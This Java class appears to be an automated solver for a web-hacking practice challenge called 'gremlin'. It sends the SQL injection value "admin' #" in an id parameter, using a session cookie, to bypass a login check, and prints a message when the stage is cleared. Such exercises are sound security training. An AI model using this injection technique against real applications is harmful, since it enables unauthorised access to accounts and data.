import java.io.*;
import java.util.*;
import java.net.*;

public class gremlin
extends BaseClass
{
@Override
public void run(){
		Configure conf = new Configure();
		if(conf.getToken().equals("exit")){
			return;
		}

		try{
			final String cookie_content = "PHPSESSID="+conf.getToken()+";";
			String content="";
				String sub_query = "?"+String.format("id=%s",URLEncoder.encode("admin' #"));
				content=queryContent(conf,cookie_content,sub_query);
				
				if(isSuccess(content)){
					System.out.println("50% pass");
					if(content.contains("Clear!")){
						System.out.println("Stage clear!");
					}
					
				}
				
			
		}
		catch(Exception e){}
	}
public static void main(String... args){

		gremlin bi = new gremlin();
		Thread th = new Thread(bi);
		th.start();
		try{
			th.join();}catch(Exception e){}
		System.out.println("program finish");
	}
}
